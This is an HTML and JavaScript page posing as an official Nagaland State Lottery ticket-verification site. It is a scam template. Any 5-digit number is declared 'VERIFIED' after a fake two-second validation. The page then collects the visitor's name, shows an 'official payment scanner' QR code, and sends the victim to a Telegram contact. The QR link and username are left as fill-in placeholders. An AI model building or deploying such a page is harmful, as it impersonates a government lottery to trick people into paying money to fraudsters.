<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Nagaland State Lottery - Official</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;800&display=swap" rel="stylesheet">
    <style>
        :root { 
            --gold: #ffb300; 
            --bg-dark: #0a0f18;
            --card-glass: rgba(255, 255, 255, 0.05);
        }
        body { 
            margin: 0; background: var(--bg-dark); font-family: 'Poppins', sans-serif; color: white;
            overflow-x: hidden; height: 100vh;
        }

        .top-bar {
            padding: 20px; background: rgba(0, 0, 0, 0.4);
            backdrop-filter: blur(15px); display: flex; justify-content: space-between;
            align-items: center; border-bottom: 1px solid rgba(255,255,255,0.1);
        }
        .logo { font-weight: 800; font-size: 16px; color: var(--gold); letter-spacing: 1px; text-transform: uppercase; }

        .container { 
            position: relative; width: 100%; height: calc(100vh - 80px);
            display: flex; justify-content: center; align-items: flex-start; padding-top: 30px;
        }

        /* Card System */
        .card {
            position: absolute; width: 90%; max-width: 400px;
            background: var(--card-glass); border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 28px; padding: 30px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.4);
            transition: all 0.6s cubic-bezier(0.68, -0.55, 0.27, 1.55);
            box-sizing: border-box;
        }

        /* Slide Animations */
        .hidden-left { transform: translateX(-150%) scale(0.8); opacity: 0; pointer-events: none; }
        .hidden-right { transform: translateX(150%) scale(0.8); opacity: 0; pointer-events: none; }
        .active-view { transform: translateX(0) scale(1); opacity: 1; pointer-events: all; }

        /* Animated Input Box (As marked in your image) */
        .input-group { margin: 25px 0; }
        label { font-size: 11px; color: #94a3b8; display: block; margin-bottom: 10px; letter-spacing: 1px; }
        
        .animated-input {
            width: 100%; background: rgba(255,255,255,0.03); border: 2px solid rgba(255,255,255,0.1);
            padding: 18px; border-radius: 16px; color: white; font-size: 22px; outline: none;
            box-sizing: border-box; text-align: center; letter-spacing: 5px;
            transition: 0.3s;
            animation: borderPulse 2s infinite; /* Continuous glow animation */
        }
        
        @keyframes borderPulse {
            0% { border-color: rgba(255, 179, 0, 0.2); box-shadow: 0 0 5px rgba(255, 179, 0, 0.1); }
            50% { border-color: var(--gold); box-shadow: 0 0 20px rgba(255, 179, 0, 0.3); }
            100% { border-color: rgba(255, 179, 0, 0.2); box-shadow: 0 0 5px rgba(255, 179, 0, 0.1); }
        }

        .btn-main {
            width: 100%; background: linear-gradient(135deg, #ffb300, #ff8f00);
            color: #000; border: none; padding: 20px; border-radius: 18px;
            font-weight: 800; font-size: 16px; cursor: pointer; text-transform: uppercase;
            box-shadow: 0 8px 20px rgba(255, 179, 0, 0.3);
        }

        /* Loader */
        #loader { display: none; text-align: center; margin-top: 15px; }
        .spinner { width: 30px; height: 30px; border: 3px solid transparent; border-top: 3px solid var(--gold); border-radius: 50%; animation: spin 0.6s linear infinite; margin: 0 auto; }
        @keyframes spin { to { transform: rotate(360deg); } }

        .qr-code { width: 180px; height: 180px; background: white; padding: 10px; border-radius: 12px; margin: 15px auto; border: 4px solid var(--gold); display: block; }
    </style>
</head>
<body>

    <div class="top-bar">
        <div class="logo">NAGALAND STATE LOTTERY</div>
        <div style="font-size: 10px; color: #4ade80;">● SERVER ACTIVE</div>
    </div>

    <div class="container">
        <div class="card active-view" id="step1">
            <h2 style="margin: 0; font-weight: 800;">Ticket Check</h2>
            <p style="color: #64748b; font-size: 13px;">Please enter your ticket number for official verification.</p>
            
            <div class="input-group">
                <label>TICKET NUMBER (MAX 5 DIGITS)</label>
                <input type="number" id="ticket-id" class="animated-input" placeholder="00000" oninput="limitDigits(this)">
            </div>

            <button class="btn-main" onclick="startVerification()">Verify Now</button>

            <div id="loader">
                <div class="spinner"></div>
                <p style="font-size: 11px; color: var(--gold); margin-top: 10px;">VALIDATING TICKET...</p>
            </div>
        </div>

        <div class="card hidden-right" id="step2">
            <div style="text-align: center; color: #4ade80; margin-bottom: 15px;">
                <h2 style="margin:0;">✓ VERIFIED</h2>
            </div>
            
            <div class="input-group">
                <label>CUSTOMER NAME</label>
                <input type="text" id="user-name" class="animated-input" style="font-size: 16px; letter-spacing: normal;" placeholder="Full Name">
            </div>

            <div style="text-align: center;">
                <p style="font-size: 12px; color: var(--gold); font-weight: bold; margin: 0;">OFFICIAL PAYMENT SCANNER</p>
                <img src="YOUR_QR_LINK_HERE" class="qr-code" alt="Scanner">
            </div>
            
            <button class="btn-main" style="background: #2e7d32; color: white;" onclick="finalSubmit()">Confirm & Pay</button>
        </div>
    </div>

    <script>
        // Limit input to 5 digits
        function limitDigits(el) {
            if (el.value.length > 5) {
                el.value = el.value.slice(0, 5);
            }
        }

        function startVerification() {
            const ticket = document.getElementById('ticket-id').value;
            if(ticket.length < 5) {
                alert("Enter exactly 5 digits.");
                return;
            }

            document.getElementById('loader').style.display = 'block';

            // Animation timing
            setTimeout(() => {
                // Slide out Step 1 to the left
                document.getElementById('step1').classList.remove('active-view');
                document.getElementById('step1').classList.add('hidden-left');

                // Slide in Step 2 from the right
                document.getElementById('step2').classList.remove('hidden-right');
                document.getElementById('step2').classList.add('active-view');
            }, 2000);
        }

        function finalSubmit() {
            const name = document.getElementById('user-name').value;
            if(!name) { alert("Please enter name."); return; }
            window.location.href = "https://t.me/YOUR_USERNAME?text=Payment_Done_by_" + name;
        }
    </script>
</body>
</html>
